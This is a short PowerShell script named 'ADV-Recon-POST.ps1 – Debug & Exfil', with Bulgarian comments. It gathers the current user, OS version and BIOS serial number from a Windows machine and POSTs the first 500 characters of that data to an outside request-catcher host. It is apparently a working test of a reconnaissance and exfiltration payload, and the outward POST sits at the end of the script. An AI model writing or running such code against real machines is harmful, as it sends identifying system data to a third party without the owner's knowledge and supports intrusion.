# =================== ADV-Recon-POST.ps1 – Debug & Exfil ===================

$output = ""

function Add-ToOutput {
    param([string]$Title, [object]$Data)
    $output += "`n===== [$Title] =====`n"
    $output += "$($Data | Out-String)`n"
}

# ----------------- Събиране на примерна информация -------------------

Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
Add-ToOutput "Current User" (whoami)

# Примерна информация от системата
try {
    $os = Get-CimInstance Win32_OperatingSystem
    Add-ToOutput "Operating System" "$($os.Caption) $($os.Version)"
} catch {
    Add-ToOutput "Operating System" "ERROR: $($_.Exception.Message)"
}

try {
    $bios = Get-CimInstance Win32_BIOS
    Add-ToOutput "BIOS Serial Number" $bios.SerialNumber
} catch {
    Add-ToOutput "BIOS Info" "ERROR: $($_.Exception.Message)"
}

# ----------------- DEBUG – показване на събраното -------------------

Write-Host "`n======== DEBUG PREVIEW ========"
Write-Host $output
Write-Host "======== END OF DEBUG ========="

# ----------------- POST към RequestCatcher (само първите 500 символа) -------------------

try {
    $preview = $output.Substring(0, [Math]::Min(500, $output.Length))
    Invoke-RestMethod -Uri "https://flipped.requestcatcher.com/" `
                      -Method POST `
                      -Body @{debug = $preview} `
                      -UseBasicParsing
    Write-Host "`nPOST sent successfully!"
} catch {
    Write-Host "`nPOST FAILED: $($_.Exception.Message)"
}
